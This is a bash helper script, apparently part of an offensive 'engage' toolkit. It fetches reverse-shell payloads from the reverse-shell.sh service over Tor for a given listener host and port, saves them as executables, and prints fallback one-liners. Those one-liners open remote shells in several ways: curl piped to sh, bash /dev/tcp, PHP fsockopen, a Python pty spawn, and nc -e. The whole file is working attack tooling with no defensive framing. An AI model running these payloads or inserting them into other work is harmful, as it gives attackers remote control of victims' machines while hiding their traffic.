# shellcheck shell=bash
# Reverse-Shell-as-a-Service (lukechilds/reverse-shell.sh) helpers for engage.

rs_url() { printf '%s' "${REVERSE_SHELL_URL:-https://reverse-shell.sh}"; }

rs_ensure_cloned() {
  if [[ -d "$LAB_ROOT/third_party/reverse-shell/.git" ]]; then return 0; fi
  echo "[rs] clone lukechilds/reverse-shell …"
  "$LAB_ROOT/scripts/fetch-reverse-shell.sh" || true
}

# Fetch payload for LHOST:LPORT into out/engage/<sid>/payloads/r  (max-14B trigger: sh</path)
rs_fetch_payload() {
  local lhost="$1" lport="$2" dest="$3"
  mkdir -p "$(dirname "$dest")"
  local url; url="$(rs_url)/${lhost}:${lport}"
  echo "[rs] GET $url → $dest"
  if curl_tor -fsSL --max-time 20 "$url" -o "$dest"; then
    chmod 755 "$dest"
    echo "[rs] Payload OK ($(wc -c < "$dest") Bytes)"
    return 0
  fi
  echo "[rs] curl fehlgeschlagen (Internet? Tor?). Fallback: manuelle One-Liner."
  return 1
}

rs_oneliners() {
  local h="$1" p="$2"
  cat <<EOF
curl -fsSL '$(rs_url)/${h}:${p}' | sh
bash -i >& /dev/tcp/${h}/${p} 0>&1
php -r '\$s=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc ${h} ${p} -e /bin/sh
EOF
}
